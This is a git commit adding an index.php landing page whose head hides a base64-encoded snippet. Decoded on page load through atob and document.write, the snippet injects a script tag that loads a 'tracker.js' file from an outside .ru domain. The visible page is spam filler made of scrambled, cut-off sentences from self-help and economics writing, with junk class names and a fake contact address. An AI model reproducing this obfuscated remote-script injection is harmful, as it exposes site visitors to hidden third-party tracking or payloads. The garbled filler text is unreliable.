081fd9a6ffc5e8f5d1b1f4f2085844abcf44b7ee
goxtrzim <81528777+goxtrzim@users.noreply.github.com>
2021-03-28 20:51:46 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9yd2g5NHp2N2oyYXBldGR5ZDciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Prescribe their own glasses for everyone they interact with.  Product differentiation c</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="zmsbo14573h1znqrot9">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="vqk1jghna87gfny">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Prescribe their own glasses for everyone they interact with.  Product differentiation c</h1>
+	</section>
+
+
+	<section class="our-work" class="qmoa0k9v2yi2o1mh">
+		<h3 class="title">Under the new system, executives receive money only</h3>
+		<p>The more people are committed to quick solutions and the more they focus on pressing problems,the more this approach itself aggravates the chronic painful condition.  Expanding perspective Sometimes some unforeseen events can knock us out of the sphere and way of thinking of the left hemisphere and move to the right.  84.  “And suddenly, with amazing clarity, I saw,” writes Gordon, “that with the wrong motives, nothing in a person’s life can be right.  For example, machinery and equipment can be replaced by the labor of workers, natural materials - by artificial ones.  Maintaining the P / PC balance is of particular importance in relation to the human resources of the organization - customers and employees.  EFFECT OF INCOME AND EFFECT OF SUBSTITUTION One and the same consumer can afford to buy a larger amount of a cheaper product.  Even that seemingly instantaneous experience of my paradigm shift in a subway car, that change in my vision, was the result of my inherent character and was limited to it.  But, reading the book by Stephen Covey, I was once again convinced that happiness is always a big job, regardless of the conditions in which you live.  The central issue of the state is the problem of developing a strategy for the country's socio-economic development with a clear definition of ultimate goals. </p>
+		<hr>
+
+		<ul class="grid" class="k9031etek9c23lr">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="qmoa0k9v2yi2o1mh">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>In other cases, people actually need a new perspective on the problem and outside support.  You did not evaluate, question, advise, or </td>
+    <td>Only when you have the self-awareness needed to evaluate your old program, and the imagination and conscience to create a new</td>
+    <td>“Answer” is the root of responsibility - the ability to choose your response to what is happening.  Whether we belong to a church community, s</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>Sharpen the Saw Every time I see the big consequences of little things ...  You do not know what new dangers and troubles await you along the way.  The</td>
+    <td>You want to lead or you want to be liked.  It is the highest achievement of all previous skills.  First-generation paradigmists, by definition, are </td>
+    <td>You can write down one or more roles as a family member - husband or wife, mother or father, son or daughter.  The room was filled wi</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>One of my favorite stories comes from the Old Testament, part of a fundamental Judeo-Christian heritage.  If I try to use</td>
+    <td>Authority: Authority comes from position and role in the church.  In this case, we do not allow problems to control us at all.  We c</td>
+    <td>And it is so easy to neglect the development of MS - teaching the child, communicating with him, listening and understanding him.  This provides you with the found</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="zmsbo14573h1znqrot9">
+		<h3 class="title">In one way or another, the enterprise reac</h3>
+		<p>It has to do with how we perceive problems.  Likewise, the true power of the Seven Habits lies in their interaction with each other, not just in each skill separately.  Just as you can not harvest without planting a seed, it is impossible to change the sequence of actions in this process.  X, but donates only 5 units this time.  Secondary needs: self-expression, entertainment, spiritual development.  Production requires certain resources that are used in the right combinations. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="vqk1jghna87gfny" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qmoa0k9v2yi2o1mh">
+		<h3 class="title">Or else I should find some kind of motivating training program </h3>
+		<p>Outdated manufacturing equipment and machinery represent high gross costs.  All of them, to a greater or lesser extent, can be complementary and interchangeable: living labor can be partially replaced by technology, and vice versa, natural raw materials can be replaced by artificial ones, etc.  Failure to meet sales targets, growing unpaid invoices, and low turnover are all signals or symptoms of deeper problems.  Each product is twofold.  Consists in its effect on reducing production costs, increasing labor productivity,production efficiency based on the implementation of the achievements of scientific and technological progress.  But if you are making a decision based on a principle-centered paradigm, your choice has several important characteristics.  Inner focus: You make decisions that fit the needs of your job.  Your power over yourself is almost imperceptible.  Dr.  General level of wages Wages differ by country, region, different occupation and individual. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="k9031etek9c23lr" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="k9031etek9c23lr" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="zmsbo14573h1znqrot9">
+		<h3 class="title">This state of affairs was unacceptable.  Suddenly S</h3>
+		<p>Gradually, your resting heart rate will decrease, and your heart and respiratory system will become more efficient.  Fourth Generation Benefits One of the reasons people refuse to use third generation time management tools is that they lose their immediacy, spontaneity; they become callous and inflexible.  As I did the research and materials I needed, I became extremely interested in how perception is formed, how it affects our attitudes, and how our attitudes affect our behavior.  Habit 4.  5.  First of all, consider the demand curve for the products of a monopolistic competitor.  However, most third-generation planning tools focus on daily planning.  Some will benefit from increased demand by increasing prices,because when there is a shortage, buyers are willing to pay more.  Typically, research involves solving one of four problems: develop, describe, test hypotheses, and predict.  The "training effect" usually occurs when your heart rate rises 72 to 87 percent of your maximum heart rate.  I am convinced that there are people who,even instantly realizing the true situation, they would experience only mild regret or vague feelings of guilt, but would continue to sit in awkward silence next to this grief-stricken person.  To bring X's consumption from 10 to 20, he reduces Y's purchases by 15, bringing them to 35.  ELASTICITY OF DEMAND FOR INCOME.  The function of a tax is a manifestation of its essence in action, a way of expressing its properties. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="vqk1jghna87gfny" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="qmoa0k9v2yi2o1mh">
+		<h3 class="title">Considering the forms of inflation in an e</h3>
+		<p>But trust takes time and patience, and doesn’t preclude the need to educate and develop people so that their abilities can match that trust.I am convinced that if leadership delegation is done correctly, both sides will benefit from it and much more work will be done in much less time.  Once, when he had been working at the university for several months, I went to his office with a request to do some urgent matters that were bothering me.  The P / PC balance has the same strong influence on the efficiency of the use of financial resources.  Often their owners are different persons, even opposing each other, which weakens the mutual desire to monopolize power.  The mower worked for two seasons, after which it began to malfunction and broke down.  Having defined your different roles, you can now think about the long-term goals you would like to achieve in each of the roles.  Now father and son are on the same side of the table and together solve the problem, instead of being on opposite sides of the table, seeing the problem in each other.  As we develop our self-awareness, many of us find ourselves in ineffective scenarios, deeply rooted unworthy habits that are incompatible withwhat we truly value in life. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="k9031etek9c23lr" class="title">In some ways they helped me, but, nevertheless, I cannot say th</h3>	
+		<p>- It seemed to me that the goal was to find an approach to solving the problem, so that the further work could be entrusted to the performers.  By noon, when it was time to conclude the meeting, the participants were in a positive, creative and synergistic mood.  46.THE ENVIRONMENT OF THE ENTERPRISE The enterprise exists in a complex world that has many impacts on it.  To say “yes” to the important priorities of Square II, you need to learn to say “no” to other, sometimes even urgent, matters.  If there is no equity capital, then you can buy the right to use the money capital.  If other factors of production are the same, then the best economic results will be achieved by an enterprise using modern equipment; 5) information.  In the course of their conversation, communication problems were highlighted.  When you are dealing with a person who has a Win / Lose paradigm, the relationship is still at the core. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="zmsbo14573h1znqrot9">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="vqk1jghna87gfny"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="qmoa0k9v2yi2o1mh"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="k9031etek9c23lr"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>707 Greenholt Cape, Apt. 618, 87471-9640, Fredrickchester, Mississippi, United States</p>
+		<p>Phone number: +73(41)159-5860175</p>
+	</footer>
+
+</body>
+
+</html>
